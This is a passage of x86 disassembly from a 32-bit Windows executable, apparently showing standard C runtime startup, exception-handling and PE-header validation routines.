  402fbe:	8b de                	mov    %esi,%ebx
  402fc0:	eb 10                	jmp    0x402fd2
  402fc2:	68 e8 03 00 00       	push   $0x3e8
  402fc7:	ff 15 60 40 40 00    	call   *0x404060
  402fcd:	eb da                	jmp    0x402fa9
  402fcf:	33 f6                	xor    %esi,%esi
  402fd1:	46                   	inc    %esi
  402fd2:	a1 30 54 40 00       	mov    0x405430,%eax
  402fd7:	3b c6                	cmp    %esi,%eax
  402fd9:	75 0a                	jne    0x402fe5
  402fdb:	6a 1f                	push   $0x1f
  402fdd:	e8 b8 05 00 00       	call   0x40359a
  402fe2:	59                   	pop    %ecx
  402fe3:	eb 2f                	jmp    0x403014
  402fe5:	a1 30 54 40 00       	mov    0x405430,%eax
  402fea:	85 c0                	test   %eax,%eax
  402fec:	75 20                	jne    0x40300e
  402fee:	89 35 30 54 40 00    	mov    %esi,0x405430
  402ff4:	68 68 41 40 00       	push   $0x404168
  402ff9:	68 5c 41 40 00       	push   $0x40415c
  402ffe:	e8 51 07 00 00       	call   0x403754
  403003:	59                   	pop    %ecx
  403004:	59                   	pop    %ecx
  403005:	85 c0                	test   %eax,%eax
  403007:	74 0b                	je     0x403014
  403009:	e9 2e 01 00 00       	jmp    0x40313c
  40300e:	89 35 cc 50 40 00    	mov    %esi,0x4050cc
  403014:	a1 30 54 40 00       	mov    0x405430,%eax
  403019:	3b c6                	cmp    %esi,%eax
  40301b:	75 1b                	jne    0x403038
  40301d:	68 58 41 40 00       	push   $0x404158
  403022:	68 44 41 40 00       	push   $0x404144
  403027:	e8 22 07 00 00       	call   0x40374e
  40302c:	59                   	pop    %ecx
  40302d:	59                   	pop    %ecx
  40302e:	c7 05 30 54 40 00 02 	movl   $0x2,0x405430
  403035:	00 00 00 
  403038:	85 db                	test   %ebx,%ebx
  40303a:	75 08                	jne    0x403044
  40303c:	53                   	push   %ebx
  40303d:	57                   	push   %edi
  40303e:	ff 15 64 40 40 00    	call   *0x404064
  403044:	83 3d 40 54 40 00 00 	cmpl   $0x0,0x405440
  40304b:	74 1b                	je     0x403068
  40304d:	68 40 54 40 00       	push   $0x405440
  403052:	e8 39 06 00 00       	call   0x403690
  403057:	59                   	pop    %ecx
  403058:	85 c0                	test   %eax,%eax
  40305a:	74 0c                	je     0x403068
  40305c:	6a 00                	push   $0x0
  40305e:	6a 02                	push   $0x2
  403060:	6a 00                	push   $0x0
  403062:	ff 15 40 54 40 00    	call   *0x405440
  403068:	a1 e8 40 40 00       	mov    0x4040e8,%eax
  40306d:	8b 30                	mov    (%eax),%esi
  40306f:	89 75 e0             	mov    %esi,-0x20(%ebp)
  403072:	8a 06                	mov    (%esi),%al
  403074:	3c 20                	cmp    $0x20,%al
  403076:	77 4c                	ja     0x4030c4
  403078:	84 c0                	test   %al,%al
  40307a:	74 06                	je     0x403082
  40307c:	83 7d e4 00          	cmpl   $0x0,-0x1c(%ebp)
  403080:	75 42                	jne    0x4030c4
  403082:	8a 06                	mov    (%esi),%al
  403084:	84 c0                	test   %al,%al
  403086:	74 0a                	je     0x403092
  403088:	3c 20                	cmp    $0x20,%al
  40308a:	77 06                	ja     0x403092
  40308c:	46                   	inc    %esi
  40308d:	89 75 e0             	mov    %esi,-0x20(%ebp)
  403090:	eb f0                	jmp    0x403082
  403092:	f6 45 c4 01          	testb  $0x1,-0x3c(%ebp)
  403096:	74 06                	je     0x40309e
  403098:	0f b7 45 c8          	movzwl -0x38(%ebp),%eax
  40309c:	eb 03                	jmp    0x4030a1
  40309e:	6a 0a                	push   $0xa
  4030a0:	58                   	pop    %eax
  4030a1:	50                   	push   %eax
  4030a2:	56                   	push   %esi
  4030a3:	6a 00                	push   $0x0
  4030a5:	68 00 00 40 00       	push   $0x400000
  4030aa:	e8 d1 f3 ff ff       	call   0x402480
  4030af:	a3 c8 50 40 00       	mov    %eax,0x4050c8
  4030b4:	83 3d bc 50 40 00 00 	cmpl   $0x0,0x4050bc
  4030bb:	75 5b                	jne    0x403118
  4030bd:	50                   	push   %eax
  4030be:	ff 15 ec 40 40 00    	call   *0x4040ec
  4030c4:	3c 22                	cmp    $0x22,%al
  4030c6:	75 0b                	jne    0x4030d3
  4030c8:	33 c9                	xor    %ecx,%ecx
  4030ca:	39 4d e4             	cmp    %ecx,-0x1c(%ebp)
  4030cd:	0f 94 c1             	sete   %cl
  4030d0:	89 4d e4             	mov    %ecx,-0x1c(%ebp)
  4030d3:	0f b6 c0             	movzbl %al,%eax
  4030d6:	50                   	push   %eax
  4030d7:	ff 15 f0 40 40 00    	call   *0x4040f0
  4030dd:	59                   	pop    %ecx
  4030de:	85 c0                	test   %eax,%eax
  4030e0:	74 04                	je     0x4030e6
  4030e2:	46                   	inc    %esi
  4030e3:	89 75 e0             	mov    %esi,-0x20(%ebp)
  4030e6:	46                   	inc    %esi
  4030e7:	eb 86                	jmp    0x40306f
  4030e9:	8b 45 ec             	mov    -0x14(%ebp),%eax
  4030ec:	8b 08                	mov    (%eax),%ecx
  4030ee:	8b 09                	mov    (%ecx),%ecx
  4030f0:	89 4d dc             	mov    %ecx,-0x24(%ebp)
  4030f3:	50                   	push   %eax
  4030f4:	51                   	push   %ecx
  4030f5:	e8 f2 04 00 00       	call   0x4035ec
  4030fa:	59                   	pop    %ecx
  4030fb:	59                   	pop    %ecx
  4030fc:	c3                   	ret
  4030fd:	8b 65 e8             	mov    -0x18(%ebp),%esp
  403100:	8b 45 dc             	mov    -0x24(%ebp),%eax
  403103:	a3 c8 50 40 00       	mov    %eax,0x4050c8
  403108:	83 3d bc 50 40 00 00 	cmpl   $0x0,0x4050bc
  40310f:	75 07                	jne    0x403118
  403111:	50                   	push   %eax
  403112:	ff 15 f8 40 40 00    	call   *0x4040f8
  403118:	83 3d cc 50 40 00 00 	cmpl   $0x0,0x4050cc
  40311f:	75 06                	jne    0x403127
  403121:	ff 15 fc 40 40 00    	call   *0x4040fc
  403127:	c7 45 fc fe ff ff ff 	movl   $0xfffffffe,-0x4(%ebp)
  40312e:	a1 c8 50 40 00       	mov    0x4050c8,%eax
  403133:	eb 13                	jmp    0x403148
  403135:	33 c0                	xor    %eax,%eax
  403137:	40                   	inc    %eax
  403138:	c3                   	ret
  403139:	8b 65 e8             	mov    -0x18(%ebp),%esp
  40313c:	c7 45 fc fe ff ff ff 	movl   $0xfffffffe,-0x4(%ebp)
  403143:	b8 ff 00 00 00       	mov    $0xff,%eax
  403148:	e8 40 01 00 00       	call   0x40328d
  40314d:	c3                   	ret
  40314e:	b8 4d 5a 00 00       	mov    $0x5a4d,%eax
  403153:	66 39 05 00 00 40 00 	cmp    %ax,0x400000
  40315a:	74 04                	je     0x403160
  40315c:	33 c0                	xor    %eax,%eax
  40315e:	eb 4d                	jmp    0x4031ad
  403160:	a1 3c 00 40 00       	mov    0x40003c,%eax
  403165:	8d 80 00 00 40 00    	lea    0x400000(%eax),%eax
  40316b:	81 38 50 45 00 00    	cmpl   $0x4550,(%eax)
  403171:	75 e9                	jne    0x40315c
  403173:	0f b7 48 18          	movzwl 0x18(%eax),%ecx
  403177:	81 f9 0b 01 00 00    	cmp    $0x10b,%ecx
  40317d:	74 1b                	je     0x40319a
  40317f:	81 f9 0b 02 00 00    	cmp    $0x20b,%ecx
  403185:	75 d5                	jne    0x40315c
  403187:	83 b8 84 00 00 00 0e 	cmpl   $0xe,0x84(%eax)
  40318e:	76 cc                	jbe    0x40315c
  403190:	33 c9                	xor    %ecx,%ecx
  403192:	39 88 f8 00 00 00    	cmp    %ecx,0xf8(%eax)
  403198:	eb 0e                	jmp    0x4031a8
  40319a:	83 78 74 0e          	cmpl   $0xe,0x74(%eax)
  40319e:	76 bc                	jbe    0x40315c
  4031a0:	33 c9                	xor    %ecx,%ecx
  4031a2:	39 88 e8 00 00 00    	cmp    %ecx,0xe8(%eax)
  4031a8:	0f 95 c1             	setne  %cl
  4031ab:	8b c1                	mov    %ecx,%eax
  4031ad:	6a 02                	push   $0x2
  4031af:	a3 bc 50 40 00       	mov    %eax,0x4050bc
  4031b4:	ff 15 a4 40 40 00    	call   *0x4040a4
  4031ba:	6a ff                	push   $0xffffffff
  4031bc:	ff 15 a0 40 40 00    	call   *0x4040a0
  4031c2:	59                   	pop    %ecx
  4031c3:	59                   	pop    %ecx
  4031c4:	a3 38 54 40 00       	mov    %eax,0x405438
  4031c9:	a3 3c 54 40 00       	mov    %eax,0x40543c
  4031ce:	ff 15 9c 40 40 00    	call   *0x40409c
  4031d4:	8b 0d 00 54 40 00    	mov    0x405400,%ecx
  4031da:	89 08                	mov    %ecx,(%eax)
  4031dc:	ff 15 d4 40 40 00    	call   *0x4040d4
  4031e2:	8b 0d fc 53 40 00    	mov    0x4053fc,%ecx
  4031e8:	89 08                	mov    %ecx,(%eax)
  4031ea:	a1 30 41 40 00       	mov    0x404130,%eax
  4031ef:	8b 00                	mov    (%eax),%eax
  4031f1:	a3 2c 54 40 00       	mov    %eax,0x40542c
  4031f6:	e8 a5 03 00 00       	call   0x4035a0
  4031fb:	e8 85 05 00 00       	call   0x403785
  403200:	83 3d 2c 50 40 00 00 	cmpl   $0x0,0x40502c
  403207:	75 0c                	jne    0x403215
  403209:	68 85 37 40 00       	push   $0x403785
  40320e:	ff 15 d8 40 40 00    	call   *0x4040d8
  403214:	59                   	pop    %ecx
  403215:	e8 40 05 00 00       	call   0x40375a
  40321a:	83 3d 28 50 40 00 ff 	cmpl   $0xffffffff,0x405028
  403221:	75 09                	jne    0x40322c
  403223:	6a ff                	push   $0xffffffff
  403225:	ff 15 dc 40 40 00    	call   *0x4040dc
  40322b:	59                   	pop    %ecx
  40322c:	33 c0                	xor    %eax,%eax
  40322e:	c3                   	ret
  40322f:	e8 54 05 00 00       	call   0x403788
  403234:	e9 36 fd ff ff       	jmp    0x402f6f
  403239:	cc                   	int3
  40323a:	ff 25 0c 41 40 00    	jmp    *0x40410c
  403240:	ff 25 08 41 40 00    	jmp    *0x404108
  403246:	cc                   	int3
  403247:	cc                   	int3
  403248:	68 a1 32 40 00       	push   $0x4032a1
  40324d:	64 ff 35 00 00 00 00 	push   %fs:0x0
  403254:	8b 44 24 10          	mov    0x10(%esp),%eax
  403258:	89 6c 24 10          	mov    %ebp,0x10(%esp)
  40325c:	8d 6c 24 10          	lea    0x10(%esp),%ebp
  403260:	2b e0                	sub    %eax,%esp
  403262:	53                   	push   %ebx
  403263:	56                   	push   %esi
  403264:	57                   	push   %edi
  403265:	a1 18 50 40 00       	mov    0x405018,%eax
  40326a:	31 45 fc             	xor    %eax,-0x4(%ebp)
  40326d:	33 c5                	xor    %ebp,%eax
  40326f:	50                   	push   %eax
  403270:	89 65 e8             	mov    %esp,-0x18(%ebp)
  403273:	ff 75 f8             	push   -0x8(%ebp)
  403276:	8b 45 fc             	mov    -0x4(%ebp),%eax
  403279:	c7 45 fc fe ff ff ff 	movl   $0xfffffffe,-0x4(%ebp)
  403280:	89 45 f8             	mov    %eax,-0x8(%ebp)
  403283:	8d 45 f0             	lea    -0x10(%ebp),%eax
  403286:	64 a3 00 00 00 00    	mov    %eax,%fs:0x0
  40328c:	c3                   	ret
  40328d:	8b 4d f0             	mov    -0x10(%ebp),%ecx
  403290:	64 89 0d 00 00 00 00 	mov    %ecx,%fs:0x0
  403297:	59                   	pop    %ecx
  403298:	5f                   	pop    %edi
  403299:	5f                   	pop    %edi
  40329a:	5e                   	pop    %esi
  40329b:	5b                   	pop    %ebx
  40329c:	8b e5                	mov    %ebp,%esp
  40329e:	5d                   	pop    %ebp
  40329f:	51                   	push   %ecx
  4032a0:	c3                   	ret
  4032a1:	8b ff                	mov    %edi,%edi
  4032a3:	55                   	push   %ebp
  4032a4:	8b ec                	mov    %esp,%ebp
  4032a6:	ff 75 14             	push   0x14(%ebp)
  4032a9:	ff 75 10             	push   0x10(%ebp)
  4032ac:	ff 75 0c             	push   0xc(%ebp)
  4032af:	ff 75 08             	push   0x8(%ebp)
  4032b2:	68 c2 2e 40 00       	push   $0x402ec2
  4032b7:	68 18 50 40 00       	push   $0x405018
  4032bc:	e8 5d 05 00 00       	call   0x40381e
  4032c1:	83 c4 18             	add    $0x18,%esp
  4032c4:	5d                   	pop    %ebp
  4032c5:	c3                   	ret
  4032c6:	6a 14                	push   $0x14
  4032c8:	68 90 45 40 00       	push   $0x404590
  4032cd:	e8 76 ff ff ff       	call   0x403248
  4032d2:	ff 35 3c 54 40 00    	push   0x40543c
  4032d8:	8b 35 bc 40 40 00    	mov    0x4040bc,%esi
  4032de:	ff d6                	call   *%esi
  4032e0:	59                   	pop    %ecx
  4032e1:	89 45 e4             	mov    %eax,-0x1c(%ebp)
  4032e4:	83 f8 ff             	cmp    $0xffffffff,%eax
  4032e7:	75 0c                	jne    0x4032f5
  4032e9:	ff 75 08             	push   0x8(%ebp)
  4032ec:	ff 15 b8 40 40 00    	call   *0x4040b8
  4032f2:	59                   	pop    %ecx
  4032f3:	eb 67                	jmp    0x40335c
  4032f5:	6a 08                	push   $0x8
  4032f7:	e8 34 05 00 00       	call   0x403830
  4032fc:	59                   	pop    %ecx
  4032fd:	83 65 fc 00          	andl   $0x0,-0x4(%ebp)
  403301:	ff 35 3c 54 40 00    	push   0x40543c
  403307:	ff d6                	call   *%esi
  403309:	89 45 e4             	mov    %eax,-0x1c(%ebp)
  40330c:	ff 35 38 54 40 00    	push   0x405438
  403312:	ff d6                	call   *%esi
  403314:	59                   	pop    %ecx
  403315:	59                   	pop    %ecx
  403316:	89 45 e0             	mov    %eax,-0x20(%ebp)
  403319:	8d 45 e0             	lea    -0x20(%ebp),%eax
  40331c:	50                   	push   %eax
  40331d:	8d 45 e4             	lea    -0x1c(%ebp),%eax
  403320:	50                   	push   %eax
  403321:	ff 75 08             	push   0x8(%ebp)
  403324:	8b 35 a0 40 40 00    	mov    0x4040a0,%esi
  40332a:	ff d6                	call   *%esi
  40332c:	59                   	pop    %ecx
  40332d:	50                   	push   %eax
  40332e:	e8 f7 04 00 00       	call   0x40382a
  403333:	89 45 dc             	mov    %eax,-0x24(%ebp)
  403336:	ff 75 e4             	push   -0x1c(%ebp)
  403339:	ff d6                	call   *%esi
  40333b:	a3 3c 54 40 00       	mov    %eax,0x40543c
  403340:	ff 75 e0             	push   -0x20(%ebp)
  403343:	ff d6                	call   *%esi
  403345:	83 c4 14             	add    $0x14,%esp
  403348:	a3 38 54 40 00       	mov    %eax,0x405438
  40334d:	c7 45 fc fe ff ff ff 	movl   $0xfffffffe,-0x4(%ebp)
  403354:	e8 09 00 00 00       	call   0x403362
  403359:	8b 45 dc             	mov    -0x24(%ebp),%eax
  40335c:	e8 2c ff ff ff       	call   0x40328d
  403361:	c3                   	ret
  403362:	6a 08                	push   $0x8
  403364:	e8 bb 04 00 00       	call   0x403824
  403369:	59                   	pop    %ecx
  40336a:	c3                   	ret
  40336b:	8b ff                	mov    %edi,%edi
  40336d:	55                   	push   %ebp
  40336e:	8b ec                	mov    %esp,%ebp
  403370:	ff 75 08             	push   0x8(%ebp)
  403373:	e8 4e ff ff ff       	call   0x4032c6
  403378:	f7 d8                	neg    %eax
  40337a:	1b c0                	sbb    %eax,%eax
  40337c:	f7 d8                	neg    %eax
  40337e:	59                   	pop    %ecx
  40337f:	48                   	dec    %eax
  403380:	5d                   	pop    %ebp
  403381:	c3                   	ret
  403382:	8b ff                	mov    %edi,%edi
  403384:	55                   	push   %ebp
  403385:	8b ec                	mov    %esp,%ebp
  403387:	81 ec 28 03 00 00    	sub    $0x328,%esp
  40338d:	a3 d8 51 40 00       	mov    %eax,0x4051d8
  403392:	89 0d d4 51 40 00    	mov    %ecx,0x4051d4
  403398:	89 15 d0 51 40 00    	mov    %edx,0x4051d0
  40339e:	89 1d cc 51 40 00    	mov    %ebx,0x4051cc
  4033a4:	89 35 c8 51 40 00    	mov    %esi,0x4051c8
  4033aa:	89 3d c4 51 40 00    	mov    %edi,0x4051c4
  4033b0:	66 8c 15 f0 51 40 00 	data16 mov %ss,0x4051f0
  4033b7:	66 8c 0d e4 51 40 00 	data16 mov %cs,0x4051e4
  4033be:	66 8c 1d c0 51 40 00 	data16 mov %ds,0x4051c0
  4033c5:	66 8c 05 bc 51 40 00 	data16 mov %es,0x4051bc
  4033cc:	66 8c 25 b8 51 40 00 	data16 mov %fs,0x4051b8
  4033d3:	66 8c 2d b4 51 40 00 	data16 mov %gs,0x4051b4
  4033da:	9c                   	pushf
  4033db:	8f 05 e8 51 40 00    	pop    0x4051e8
  4033e1:	8b 45 00             	mov    0x0(%ebp),%eax
  4033e4:	a3 dc 51 40 00       	mov    %eax,0x4051dc
  4033e9:	8b 45 04             	mov    0x4(%ebp),%eax
  4033ec:	a3 e0 51 40 00       	mov    %eax,0x4051e0
  4033f1:	8d 45 08             	lea    0x8(%ebp),%eax
  4033f4:	a3 ec 51 40 00       	mov    %eax,0x4051ec
  4033f9:	8b 85 e0 fc ff ff    	mov    -0x320(%ebp),%eax
  4033ff:	c7 05 28 51 40 00 01 	movl   $0x10001,0x405128
  403406:	00 01 00 
  403409:	a1 e0 51 40 00       	mov    0x4051e0,%eax
  40340e:	a3 dc 50 40 00       	mov    %eax,0x4050dc
  403413:	c7 05 d0 50 40 00 09 	movl   $0xc0000409,0x4050d0
  40341a:	04 00 c0 
  40341d:	c7 05 d4 50 40 00 01 	movl   $0x1,0x4050d4
  403424:	00 00 00 
  403427:	a1 18 50 40 00       	mov    0x405018,%eax
  40342c:	89 85 d8 fc ff ff    	mov    %eax,-0x328(%ebp)
  403432:	a1 1c 50 40 00       	mov    0x40501c,%eax
  403437:	89 85 dc fc ff ff    	mov    %eax,-0x324(%ebp)
  40343d:	ff 15 44 40 40 00    	call   *0x404044
  403443:	a3 20 51 40 00       	mov    %eax,0x405120
  403448:	6a 01                	push   $0x1
  40344a:	e8 e7 03 00 00       	call   0x403836
  40344f:	59                   	pop    %ecx
  403450:	6a 00                	push   $0x0
  403452:	ff 15 48 40 40 00    	call   *0x404048
  403458:	68 e0 41 40 00       	push   $0x4041e0
  40345d:	ff 15 4c 40 40 00    	call   *0x40404c
  403463:	83 3d 20 51 40 00 00 	cmpl   $0x0,0x405120
  40346a:	75 08                	jne    0x403474
  40346c:	6a 01                	push   $0x1
  40346e:	e8 c3 03 00 00       	call   0x403836
  403473:	59                   	pop    %ecx
  403474:	68 09 04 00 c0       	push   $0xc0000409
  403479:	ff 15 50 40 40 00    	call   *0x404050
  40347f:	50                   	push   %eax
  403480:	ff 15 54 40 40 00    	call   *0x404054
  403486:	c9                   	leave
  403487:	c3                   	ret
  403488:	6a 14                	push   $0x14
  40348a:	68 b0 45 40 00       	push   $0x4045b0
  40348f:	e8 b4 fd ff ff       	call   0x403248
  403494:	83 65 fc 00          	andl   $0x0,-0x4(%ebp)
  403498:	ff 4d 10             	decl   0x10(%ebp)
  40349b:	78 3a                	js     0x4034d7
  40349d:	8b 4d 08             	mov    0x8(%ebp),%ecx
  4034a0:	2b 4d 0c             	sub    0xc(%ebp),%ecx
  4034a3:	89 4d 08             	mov    %ecx,0x8(%ebp)
  4034a6:	ff 55 14             	call   *0x14(%ebp)
  4034a9:	eb ed                	jmp    0x403498
  4034ab:	8b 45 ec             	mov    -0x14(%ebp),%eax
  4034ae:	89 45 e4             	mov    %eax,-0x1c(%ebp)
  4034b1:	8b 45 e4             	mov    -0x1c(%ebp),%eax
  4034b4:	8b 00                	mov    (%eax),%eax
  4034b6:	89 45 e0             	mov    %eax,-0x20(%ebp)
  4034b9:	8b 45 e0             	mov    -0x20(%ebp),%eax
  4034bc:	81 38 63 73 6d e0    	cmpl   $0xe06d7363,(%eax)
  4034c2:	74 0b                	je     0x4034cf
  4034c4:	c7 45 dc 00 00 00 00 	movl   $0x0,-0x24(%ebp)
  4034cb:	8b 45 dc             	mov    -0x24(%ebp),%eax
  4034ce:	c3                   	ret
  4034cf:	e8 68 03 00 00       	call   0x40383c
  4034d4:	8b 65 e8             	mov    -0x18(%ebp),%esp
  4034d7:	c7 45 fc fe ff ff ff 	movl   $0xfffffffe,-0x4(%ebp)
  4034de:	e8 aa fd ff ff       	call   0x40328d
  4034e3:	c2 10 00             	ret    $0x10
  4034e6:	6a 0c                	push   $0xc
  4034e8:	68 d0 45 40 00       	push   $0x4045d0
  4034ed:	e8 56 fd ff ff       	call   0x403248
  4034f2:	83 65 e4 00          	andl   $0x0,-0x1c(%ebp)
  4034f6:	8b 75 0c             	mov    0xc(%ebp),%esi
  4034f9:	8b c6                	mov    %esi,%eax
  4034fb:	0f af 45 10          	imul   0x10(%ebp),%eax
  4034ff:	01 45 08             	add    %eax,0x8(%ebp)
  403502:	83 65 fc 00          	andl   $0x0,-0x4(%ebp)
  403506:	ff 4d 10             	decl   0x10(%ebp)
  403509:	78 0b                	js     0x403516
  40350b:	29 75 08             	sub    %esi,0x8(%ebp)
  40350e:	8b 4d 08             	mov    0x8(%ebp),%ecx
  403511:	ff 55 14             	call   *0x14(%ebp)
  403514:	eb f0                	jmp    0x403506
  403516:	c7 45 e4 01 00 00 00 	movl   $0x1,-0x1c(%ebp)
  40351d:	c7 45 fc fe ff ff ff 	movl   $0xfffffffe,-0x4(%ebp)
  403524:	e8 08 00 00 00       	call   0x403531
  403529:	e8 5f fd ff ff       	call   0x40328d
  40352e:	c2 10 00             	ret    $0x10
  403531:	83 7d e4 00          	cmpl   $0x0,-0x1c(%ebp)
  403535:	75 11                	jne    0x403548
  403537:	ff 75 14             	push   0x14(%ebp)
  40353a:	ff 75 10             	push   0x10(%ebp)
  40353d:	ff 75 0c             	push   0xc(%ebp)
  403540:	ff 75 08             	push   0x8(%ebp)
  403543:	e8 40 ff ff ff       	call   0x403488
  403548:	c3                   	ret
  403549:	8b ff                	mov    %edi,%edi
  40354b:	55                   	push   %ebp
  40354c:	8b ec                	mov    %esp,%ebp
  40354e:	8b 45 08             	mov    0x8(%ebp),%eax
  403551:	8b 00                	mov    (%eax),%eax
  403553:	81 38 63 73 6d e0    	cmpl   $0xe06d7363,(%eax)
  403559:	75 2a                	jne    0x403585
  40355b:	83 78 10 03          	cmpl   $0x3,0x10(%eax)
  40355f:	75 24                	jne    0x403585
  403561:	8b 40 14             	mov    0x14(%eax),%eax
  403564:	3d 20 05 93 19       	cmp    $0x19930520,%eax
  403569:	74 15                	je     0x403580
  40356b:	3d 21 05 93 19       	cmp    $0x19930521,%eax
  403570:	74 0e                	je     0x403580
  403572:	3d 22 05 93 19       	cmp    $0x19930522,%eax
  403577:	74 07                	je     0x403580
  403579:	3d 00 40 99 01       	cmp    $0x1994000,%eax
  40357e:	75 05                	jne    0x403585
  403580:	e8 b7 02 00 00       	call   0x40383c
  403585:	33 c0                	xor    %eax,%eax
  403587:	5d                   	pop    %ebp
  403588:	c2 04 00             	ret    $0x4
  40358b:	68 49 35 40 00       	push   $0x403549
  403590:	ff 15 48 40 40 00    	call   *0x404048
  403596:	33 c0                	xor    %eax,%eax
  403598:	c3                   	ret
  403599:	cc                   	int3
  40359a:	ff 25 04 41 40 00    	jmp    *0x404104
  4035a0:	8b ff                	mov    %edi,%edi
  4035a2:	56                   	push   %esi
  4035a3:	b8 38 45 40 00       	mov    $0x404538,%eax
  4035a8:	be 38 45 40 00       	mov    $0x404538,%esi
  4035ad:	57                   	push   %edi
  4035ae:	8b f8                	mov    %eax,%edi
  4035b0:	3b c6                	cmp    %esi,%eax
  4035b2:	73 0f                	jae    0x4035c3
  4035b4:	8b 07                	mov    (%edi),%eax
  4035b6:	85 c0                	test   %eax,%eax
  4035b8:	74 02                	je     0x4035bc
  4035ba:	ff d0                	call   *%eax
  4035bc:	83 c7 04             	add    $0x4,%edi
  4035bf:	3b fe                	cmp    %esi,%edi
  4035c1:	72 f1                	jb     0x4035b4
  4035c3:	5f                   	pop    %edi
  4035c4:	5e                   	pop    %esi
  4035c5:	c3                   	ret
  4035c6:	8b ff                	mov    %edi,%edi
  4035c8:	56                   	push   %esi
  4035c9:	b8 40 45 40 00       	mov    $0x404540,%eax
  4035ce:	be 40 45 40 00       	mov    $0x404540,%esi
  4035d3:	57                   	push   %edi
  4035d4:	8b f8                	mov    %eax,%edi
  4035d6:	3b c6                	cmp    %esi,%eax
  4035d8:	73 0f                	jae    0x4035e9
  4035da:	8b 07                	mov    (%edi),%eax
  4035dc:	85 c0                	test   %eax,%eax
  4035de:	74 02                	je     0x4035e2
  4035e0:	ff d0                	call   *%eax
  4035e2:	83 c7 04             	add    $0x4,%edi
  4035e5:	3b fe                	cmp    %esi,%edi
  4035e7:	72 f1                	jb     0x4035da
  4035e9:	5f                   	pop    %edi
  4035ea:	5e                   	pop    %esi
  4035eb:	c3                   	ret
  4035ec:	ff 25 f4 40 40 00    	jmp    *0x4040f4
  4035f2:	cc                   	int3
  4035f3:	cc                   	int3
  4035f4:	cc                   	int3
  4035f5:	cc                   	int3
  4035f6:	cc                   	int3
  4035f7:	cc                   	int3
  4035f8:	cc                   	int3
  4035f9:	cc                   	int3
  4035fa:	cc                   	int3
  4035fb:	cc                   	int3
  4035fc:	cc                   	int3
  4035fd:	cc                   	int3
  4035fe:	cc                   	int3
  4035ff:	cc                   	int3
  403600:	8b ff                	mov    %edi,%edi
  403602:	55                   	push   %ebp
  403603:	8b ec                	mov    %esp,%ebp
  403605:	8b 4d 08             	mov    0x8(%ebp),%ecx
  403608:	b8 4d 5a 00 00       	mov    $0x5a4d,%eax
  40360d:	66 39 01             	cmp    %ax,(%ecx)
  403610:	74 04                	je     0x403616
  403612:	33 c0                	xor    %eax,%eax
  403614:	5d                   	pop    %ebp
  403615:	c3                   	ret
  403616:	8b 41 3c             	mov    0x3c(%ecx),%eax
  403619:	03 c1                	add    %ecx,%eax
  40361b:	81 38 50 45 00 00    	cmpl   $0x4550,(%eax)
  403621:	75 ef                	jne    0x403612
  403623:	33 d2                	xor    %edx,%edx
  403625:	b9 0b 01 00 00       	mov    $0x10b,%ecx
  40362a:	66 39 48 18          	cmp    %cx,0x18(%eax)
  40362e:	0f 94 c2             	sete   %dl
  403631:	8b c2                	mov    %edx,%eax
  403633:	5d                   	pop    %ebp
  403634:	c3                   	ret
  403635:	cc                   	int3
  403636:	cc                   	int3
  403637:	cc                   	int3
  403638:	cc                   	int3
  403639:	cc                   	int3
  40363a:	cc                   	int3
  40363b:	cc                   	int3
  40363c:	cc                   	int3
  40363d:	cc                   	int3
  40363e:	cc                   	int3
  40363f:	cc                   	int3
  403640:	8b ff                	mov    %edi,%edi
  403642:	55                   	push   %ebp
  403643:	8b ec                	mov    %esp,%ebp
  403645:	8b 45 08             	mov    0x8(%ebp),%eax
  403648:	8b 48 3c             	mov    0x3c(%eax),%ecx
  40364b:	03 c8                	add    %eax,%ecx
  40364d:	0f b7 41 14          	movzwl 0x14(%ecx),%eax
  403651:	53                   	push   %ebx
  403652:	56                   	push   %esi
  403653:	0f b7 71 06          	movzwl 0x6(%ecx),%esi
  403657:	33 d2                	xor    %edx,%edx
  403659:	57                   	push   %edi
  40365a:	8d 44 08 18          	lea    0x18(%eax,%ecx,1),%eax
  40365e:	85 f6                	test   %esi,%esi
  403660:	76 1b                	jbe    0x40367d
  403662:	8b 7d 0c             	mov    0xc(%ebp),%edi
  403665:	8b 48 0c             	mov    0xc(%eax),%ecx
  403668:	3b f9                	cmp    %ecx,%edi
  40366a:	72 09                	jb     0x403675
  40366c:	8b 58 08             	mov    0x8(%eax),%ebx
  40366f:	03 d9                	add    %ecx,%ebx
  403671:	3b fb                	cmp    %ebx,%edi
  403673:	72 0a                	jb     0x40367f
  403675:	42                   	inc    %edx
  403676:	83 c0 28             	add    $0x28,%eax
  403679:	3b d6                	cmp    %esi,%edx
  40367b:	72 e8                	jb     0x403665
  40367d:	33 c0                	xor    %eax,%eax
  40367f:	5f                   	pop    %edi
  403680:	5e                   	pop    %esi
  403681:	5b                   	pop    %ebx
  403682:	5d                   	pop    %ebp
  403683:	c3                   	ret
  403684:	cc                   	int3
  403685:	cc                   	int3
  403686:	cc                   	int3
  403687:	cc                   	int3
  403688:	cc                   	int3
  403689:	cc                   	int3
  40368a:	cc                   	int3
  40368b:	cc                   	int3
  40368c:	cc                   	int3
  40368d:	cc                   	int3
  40368e:	cc                   	int3
  40368f:	cc                   	int3
  403690:	8b ff                	mov    %edi,%edi
  403692:	55                   	push   %ebp
  403693:	8b ec                	mov    %esp,%ebp
  403695:	6a fe                	push   $0xfffffffe
  403697:	68 f0 45 40 00       	push   $0x4045f0
  40369c:	68 a1 32 40 00       	push   $0x4032a1
  4036a1:	64 a1 00 00 00 00    	mov    %fs:0x0,%eax
  4036a7:	50                   	push   %eax
  4036a8:	83 ec 08             	sub    $0x8,%esp
  4036ab:	53                   	push   %ebx
  4036ac:	56                   	push   %esi
  4036ad:	57                   	push   %edi
  4036ae:	a1 18 50 40 00       	mov    0x405018,%eax
  4036b3:	31 45 f8             	xor    %eax,-0x8(%ebp)
  4036b6:	33 c5                	xor    %ebp,%eax
  4036b8:	50                   	push   %eax
  4036b9:	8d 45 f0             	lea    -0x10(%ebp),%eax
  4036bc:	64 a3 00 00 00 00    	mov    %eax,%fs:0x0
  4036c2:	89 65 e8             	mov    %esp,-0x18(%ebp)
  4036c5:	c7 45 fc 00 00 00 00 	movl   $0x0,-0x4(%ebp)
  4036cc:	68 00 00 40 00       	push   $0x400000
  4036d1:	e8 2a ff ff ff       	call   0x403600
  4036d6:	83 c4 04             	add    $0x4,%esp
  4036d9:	85 c0                	test   %eax,%eax
  4036db:	74 55                	je     0x403732
  4036dd:	8b 45 08             	mov    0x8(%ebp),%eax
  4036e0:	2d 00 00 40 00       	sub    $0x400000,%eax
  4036e5:	50                   	push   %eax
  4036e6:	68 00 00 40 00       	push   $0x400000
  4036eb:	e8 50 ff ff ff       	call   0x403640
